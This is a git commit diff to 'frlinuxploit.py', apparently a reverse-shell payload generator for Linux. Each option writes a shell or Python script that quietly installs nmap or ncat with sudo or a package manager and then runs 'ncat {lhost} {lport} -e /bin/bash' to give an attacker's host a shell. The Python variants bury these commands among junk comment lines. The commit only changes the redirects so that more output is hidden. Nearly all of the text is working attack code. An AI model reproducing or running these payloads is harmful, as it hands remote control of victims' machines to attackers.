ad3be21142378122b59983d6d7fd0076b3b1500d
febinrev <52229330+febinrev@users.noreply.github.com>
2019-08-18 09:03:58 +0530

    Update frlinuxploit.py

--- frlinuxploit.py
+++ frlinuxploit.py
@@ -38,43 +38,43 @@ payload=input("frsf(choose payload)# ")
 if payload=="1":
 	print(f"GENERATING PAYLOAD {output}/{name}.sh ")
 	with open(f"{output}/{name}.sh","w+") as f:
-		s=(f"""sudo apt-get install nmap -y > /dev/null
+		s=(f"""sudo apt-get install nmap -y &> /dev/null
 sudo apt-get install ncat -y > /dev/null
-ncat {lhost} {lport} -e /bin/bash > /dev/null
+ncat {lhost} {lport} -e /bin/bash &> /dev/null
 		""")
 		f.write(s)
 		os.system(f"chmod +x {output}/{name}.sh ")
 elif payload=="2":
 	print("GENERATING PAYLOAD.......")
 	with open(f"{output}/{name}.sh","w+") as f:
-		s=(f"""sudo pacman -S install nmap -y > /dev/null
-sudo pacman -S install ncat -y > /dev/null
-ncat {lhost} {lport} -e /bin/bash > /dev/null
+		s=(f"""sudo pacman -S install nmap -y &> /dev/null
+sudo pacman -S install ncat -y &> /dev/null
+ncat {lhost} {lport} -e /bin/bash &> /dev/null
 		""")
 		f.write(s)
 		os.system(f"chmod +x {output}/{name}.sh ")
 elif payload=="3":
 	print("GENERATING PAYLOAD.......")
 	with open(f"{output}/{name}.sh","w+") as f:
-		s=(f"""sudo dnf install nmap-ncat -y > /dev/null
-ncat {lhost} {lport} -e /bin/bash > /dev/null
+		s=(f"""sudo dnf install nmap-ncat -y &> /dev/null
+ncat {lhost} {lport} -e /bin/bash &> /dev/null
 		""")
 		f.write(s)
 		os.system(f"chmod +x {output}/{name}.sh ")
 elif payload=="4":
 	print("GENERATING PAYLOAD.......")
 	with open(f"{output}/{name}.sh","w+") as f:
-		s=(f"""sudo yum install nmap-ncat -y > /dev/null
-ncat {lhost} {lport} -e /bin/bash > /dev/null
+		s=(f"""sudo yum install nmap-ncat -y &> /dev/null
+ncat {lhost} {lport} -e /bin/bash &> /dev/null
 		""")
 		f.write(s)
 		os.system(f"chmod +x {output}/{name}.sh ")
 elif payload=="5":
 	print("GENERATING PAYLOAD.......")
 	with open(f"{output}/{name}.sh","w+") as f:
-		s=(f"""apt-get install nmap -y > /dev/null
-apt-get install ncat -y > /dev/null
-ncat {lhost} {lport} -e /bin/bash > /dev/null
+		s=(f"""apt-get install nmap -y &> /dev/null
+apt-get install ncat -y &> /dev/null
+ncat {lhost} {lport} -e /bin/bash &> /dev/null
 		""")
 		f.write(s)
 		os.system(f"chmod +x {output}/{name}.sh ")
@@ -84,13 +84,13 @@ elif payload=="6":
 #jhsjkdhsjkghkjsghdkjahkjhgkdjghkjhsakjhdkjhkjhadksjhkjhdsjhj
 #kjhgksjhakjhgkjhdkjhlsdjlakjsdhlkjlakjhsdllsjhlsdhjshdjhsdjhbkj
 #kjkasjhkjhhugkjfoldll
-os.system("sudo apt-get install nmap -y > /dev/null")
+os.system("sudo apt-get install nmap -y &> /dev/null")
 #lkjhlkjdghsjhgjkkdjkaslkslkjlas;aslk;llklskkdjkjsjh
 #kjhbskjhgsajkdhjkshda
 #lkjhkjhgjhsjhlkjglkhlkjhlkjhkjkljhksssssssssssss
-os.system("sudo apt-get install ncat -y > /dev/null")
+os.system("sudo apt-get install ncat -y &> /dev/null")
 #jhkjhjkhgkjhgkjhgjdkjhfjld
-os.system(f"ncat {lhost} {lport} -e /bin/bash > /dev/null")
+os.system(f"ncat {lhost} {lport} -e /bin/bash &> /dev/null")
 #jakskjsdjhksdjkdskjdsjkdjjdsjkjhkjgkjfdhjkkfkjfdjfdjjfjfjjfj
 	""")
 	f=open(f"{output}/{name}.py","w+")
@@ -102,13 +102,13 @@ elif payload=="7":
 #jhsjkdhsjkghkjsghdkjahkjhgkdjghkjhsakjhdkjhkjhadksjhkjhdsjhj
 #kjhgksjhakjhgkjhdkjhlsdjlakjsdhlkjlakjhsdllsjhlsdhjshdjhsdjhbkj
 #kjkasjhkjhhugkjfoldll
-os.system("sudo pacman -S install nmap -y > /dev/null")
+os.system("sudo pacman -S install nmap -y &> /dev/null")
 #lkjhlkjdghsjhgjkkdjkaslkslkjlas;aslk;llklskkdjkjsjh
 #kjhbskjhgsajkdhjkshda
 #lkjhkjhgjhsjhlkjglkhlkjhlkjhkjkljhksssssssssssss
-os.system("sudo pacman -S install ncat -y > /dev/null")
+os.system("sudo pacman -S install ncat -y &> /dev/null")
 #jhkjhjkhgkjhgkjhgjdkjhfjld
-os.system(f"ncat {lhost} {lport} -e /bin/bash > /dev/null")
+os.system(f"ncat {lhost} {lport} -e /bin/bash &> /dev/null")
 #jakskjsdjhksdjkdskjdsjkdjjdsjkjhkjgkjfdhjkkfkjfdjfdjjfjfjjfj
 	""")
 	f=open(f"{output}/{name}.py","w+")
@@ -120,12 +120,12 @@ elif payload=="8":
 #jhsjkdhsjkghkjsghdkjahkjhgkdjghkjhsakjhdkjhkjhadksjhkjhdsjhj
 #kjhgksjhakjhgkjhdkjhlsdjlakjsdhlkjlakjhsdllsjhlsdhjshdjhsdjhbkj
 #kjkasjhkjhhugkjfoldll
-os.system("sudo dnf install nmap-ncat -y > /dev/null")
+os.system("sudo dnf install nmap-ncat -y &> /dev/null")
 #lkjhlkjdghsjhgjkkdjkaslkslkjlas;aslk;llklskkdjkjsjh
 #kjhbskjhgsajkdhjkshda
 #lkjhkjhgjhsjhlkjglkhlkjhlkjhkjkljhksssssssssssss
 #jhkjhjkhgkjhgkjhgjdkjhfjld
-os.system(f"ncat {lhost} {lport} -e /bin/bash > /dev/null")
+os.system(f"ncat {lhost} {lport} -e /bin/bash &> /dev/null")
 #jakskjsdjhksdjkdskjdsjkdjjdsjkjhkjgkjfdhjkkfkjfdjfdjjfjfjjfj
 	""")
 	f=open(f"{output}/{name}.py","w+")
@@ -137,12 +137,12 @@ elif payload=="9":
 #jhsjkdhsjkghkjsghdkjahkjhgkdjghkjhsakjhdkjhkjhadksjhkjhdsjhj
 #kjhgksjhakjhgkjhdkjhlsdjlakjsdhlkjlakjhsdllsjhlsdhjshdjhsdjhbkj
 #kjkasjhkjhhugkjfoldll
-os.system("sudo yum install nmap-ncat -y > /dev/null")
+os.system("sudo yum install nmap-ncat -y &> /dev/null")
 #lkjhlkjdghsjhgjkkdjkaslkslkjlas;aslk;llklskkdjkjsjh
 #kjhbskjhgsajkdhjkshda
 #lkjhkjhgjhsjhlkjglkhlkjhlkjhkjkljhksssssssssssss
 #jhkjhjkhgkjhgkjhgjdkjhfjld
-os.system(f"ncat {lhost} {lport} -e /bin/bash > /dev/null")
+os.system(f"ncat {lhost} {lport} -e /bin/bash &> /dev/null")
 #jakskjsdjhksdjkdskjdsjkdjjdsjkjhkjgkjfdhjkkfkjfdjfdjjfjfjjfj
 	""")
 	f=open(f"{output}/{name}.py","w+")
@@ -155,13 +155,13 @@ elif payload=="10":
 #jhsjkdhsjkghkjsghdkjahkjhgkdjghkjhsakjhdkjhkjhadksjhkjhdsjhj
 #kjhgksjhakjhgkjhdkjhlsdjlakjsdhlkjlakjhsdllsjhlsdhjshdjhsdjhbkj
 #kjkasjhkjhhugkjfoldll
-os.system("apt-get install nmap -y > /dev/null")
+os.system("apt-get install nmap -y &> /dev/null")
 #lkjhlkjdghsjhgjkkdjkaslkslkjlas;aslk;llklskkdjkjsjh
 #kjhbskjhgsajkdhjkshda
 #lkjhkjhgjhsjhlkjglkhlkjhlkjhkjkljhksssssssssssss
-os.system("apt-get install ncat -y > /dev/null")
+os.system("apt-get install ncat -y &> /dev/null")
 #jhkjhjkhgkjhgkjhgjdkjhfjld
-os.system(f"ncat {lhost} {lport} -e /bin/bash > /dev/null")
+os.system(f"ncat {lhost} {lport} -e /bin/bash &> /dev/null")
 #jakskjsdjhksdjkdskjdsjkdjjdsjkjhkjgkjfdhjkkfkjfdjfdjjfjfjjfj
 	""")
 	f=open(f"{output}/{name}.py","w+")
